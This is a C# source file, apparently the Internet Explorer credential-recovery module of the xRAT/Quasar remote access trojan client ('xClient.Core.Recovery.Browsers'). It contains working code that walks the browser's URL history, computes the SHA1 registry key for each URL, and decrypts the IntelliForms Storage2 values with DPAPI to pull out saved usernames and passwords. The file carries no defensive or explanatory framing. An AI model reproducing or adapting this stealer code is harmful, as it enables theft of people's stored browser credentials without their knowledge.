using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using xClient.Core.Data;
using xClient.Core.Helper;

namespace xClient.Core.Recovery.Browsers;

public static class InternetExplorer
{
	private struct IESecretInfoHeader
	{
		public uint dwIdHeader;

		public uint dwSize;

		public uint dwTotalSecrets;

		public uint unknown;

		public uint id4;

		public uint unknownZero;
	}

	private struct IEAutoComplteSecretHeader
	{
		public uint dwSize;

		public uint dwSecretInfoSize;

		public uint dwSecretSize;

		public IESecretInfoHeader IESecretHeader;
	}

	[StructLayout(LayoutKind.Explicit)]
	private struct SecretEntry
	{
		[FieldOffset(0)]
		public uint dwOffset;

		[FieldOffset(4)]
		public byte SecretId;

		[FieldOffset(5)]
		public byte SecretId1;

		[FieldOffset(6)]
		public byte SecretId2;

		[FieldOffset(7)]
		public byte SecretId3;

		[FieldOffset(8)]
		public byte SecretId4;

		[FieldOffset(9)]
		public byte SecretId5;

		[FieldOffset(10)]
		public byte SecretId6;

		[FieldOffset(11)]
		public byte SecretId7;

		[FieldOffset(12)]
		public uint dwLength;
	}

	private enum ALG_ID
	{
		CALG_MD5 = 32771,
		CALG_SHA1
	}

	private enum HashParameters
	{
		HP_ALGID = 1,
		HP_HASHVAL = 2,
		HP_HASHSIZE = 4
	}

	private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

	private const uint PROV_RSA_FULL = 1u;

	private const uint CRYPT_VERIFYCONTEXT = 4026531840u;

	private const int ALG_CLASS_HASH = 32768;

	private const int ALG_SID_SHA1 = 4;

	public static List<RecoveredAccount> GetSavedPasswords()
	{
		List<RecoveredAccount> list = new List<RecoveredAccount>();
		try
		{
			using ExplorerUrlHistory explorerUrlHistory = new ExplorerUrlHistory();
			List<string[]> list2 = new List<string[]>();
			ExplorerUrlHistory.STATURLEnumerator enumerator = explorerUrlHistory.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					STATURL current = enumerator.Current;
					try
					{
						if (!DecryptIePassword(current.UrlString, list2))
						{
							continue;
						}
						foreach (string[] item in list2)
						{
							list.Add(new RecoveredAccount
							{
								Username = item[0],
								Password = item[1],
								URL = current.UrlString,
								Application = "InternetExplorer"
							});
						}
					}
					catch (Exception)
					{
					}
				}
				return list;
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<RecoveredAccount> GetSavedCookies()
	{
		return new List<RecoveredAccount>();
	}

	private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
	{
		GCHandle gCHandle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
		T result = (T)Marshal.PtrToStructure(gCHandle.AddrOfPinnedObject(), typeof(T));
		gCHandle.Free();
		return result;
	}

	private static bool DecryptIePassword(string url, List<string[]> dataList)
	{
		string uRLHashString = GetURLHashString(url);
		if (!DoesURLMatchWithHash(uRLHashString))
		{
			return false;
		}
		byte[] array;
		using (RegistryKey registryKey = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2"))
		{
			if (registryKey == null)
			{
				return false;
			}
			array = (byte[])registryKey.GetValue(uRLHashString);
		}
		byte[] array2 = new byte[2 * (url.Length + 1)];
		Buffer.BlockCopy(url.ToCharArray(), 0, array2, 0, url.Length * 2);
		byte[] array3 = ProtectedData.Unprotect(array, array2, (DataProtectionScope)0);
		IEAutoComplteSecretHeader iEAutoComplteSecretHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(array3);
		if (array3.Length >= iEAutoComplteSecretHeader.dwSize + iEAutoComplteSecretHeader.dwSecretInfoSize + iEAutoComplteSecretHeader.dwSecretSize)
		{
			uint num = iEAutoComplteSecretHeader.IESecretHeader.dwTotalSecrets / 2u;
			int num2 = Marshal.SizeOf(typeof(SecretEntry));
			byte[] array4 = new byte[iEAutoComplteSecretHeader.dwSecretSize];
			int srcOffset = (int)(iEAutoComplteSecretHeader.dwSize + iEAutoComplteSecretHeader.dwSecretInfoSize);
			Buffer.BlockCopy(array3, srcOffset, array4, 0, array4.Length);
			if (dataList == null)
			{
				dataList = new List<string[]>();
			}
			else
			{
				dataList.Clear();
			}
			srcOffset = Marshal.SizeOf((object)iEAutoComplteSecretHeader);
			for (int i = 0; i < num; i++)
			{
				byte[] array5 = new byte[num2];
				Buffer.BlockCopy(array3, srcOffset, array5, 0, array5.Length);
				SecretEntry secretEntry = ByteArrayToStructure<SecretEntry>(array5);
				string[] array6 = new string[3];
				byte[] array7 = new byte[secretEntry.dwLength * 2];
				Buffer.BlockCopy(array4, (int)secretEntry.dwOffset, array7, 0, array7.Length);
				array6[0] = Encoding.Unicode.GetString(array7);
				srcOffset += num2;
				Buffer.BlockCopy(array3, srcOffset, array5, 0, array5.Length);
				secretEntry = ByteArrayToStructure<SecretEntry>(array5);
				byte[] array8 = new byte[secretEntry.dwLength * 2];
				Buffer.BlockCopy(array4, (int)secretEntry.dwOffset, array8, 0, array8.Length);
				array6[1] = Encoding.Unicode.GetString(array8);
				array6[2] = uRLHashString;
				dataList.Add(array6);
				srcOffset += num2;
			}
		}
		return true;
	}

	private static bool DoesURLMatchWithHash(string urlHash)
	{
		bool result = false;
		using RegistryKey registryKey = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2");
		if (registryKey == null)
		{
			return false;
		}
		if (registryKey.GetValueNames().Any((string value) => value == urlHash))
		{
			return true;
		}
		return result;
	}

	private static string GetURLHashString(string wstrURL)
	{
		IntPtr phProv = IntPtr.Zero;
		IntPtr phHash = IntPtr.Zero;
		CryptAcquireContext(out phProv, string.Empty, string.Empty, 1u, 4026531840u);
		if (!CryptCreateHash(phProv, ALG_ID.CALG_SHA1, IntPtr.Zero, 0u, ref phHash))
		{
			throw new Win32Exception(Marshal.GetLastWin32Error());
		}
		byte[] bytes = Encoding.Unicode.GetBytes(wstrURL);
		StringBuilder stringBuilder = new StringBuilder(42);
		if (CryptHashData(phHash, bytes, (wstrURL.Length + 1) * 2, 0u))
		{
			uint pdwDataLen = 20u;
			byte[] array = new byte[20];
			if (!CryptGetHashParam(phHash, HashParameters.HP_HASHVAL, array, ref pdwDataLen, 0u))
			{
				throw new Win32Exception(Marshal.GetLastWin32Error());
			}
			byte b = 0;
			stringBuilder.Length = 0;
			for (int i = 0; i < pdwDataLen; i++)
			{
				byte b2 = array[i];
				b = (byte)(b + b2);
				stringBuilder.AppendFormat("{0:X2}", b2);
			}
			stringBuilder.AppendFormat("{0:X2}", b);
			CryptDestroyHash(phHash);
		}
		CryptReleaseContext(phProv, 0u);
		return stringBuilder.ToString();
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptAcquireContext(out IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptCreateHash(IntPtr hProv, ALG_ID algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptHashData(IntPtr hHash, byte[] pbData, int dwDataLen, uint dwFlags);

	[DllImport("advapi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptDestroyHash(IntPtr hHash);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
}
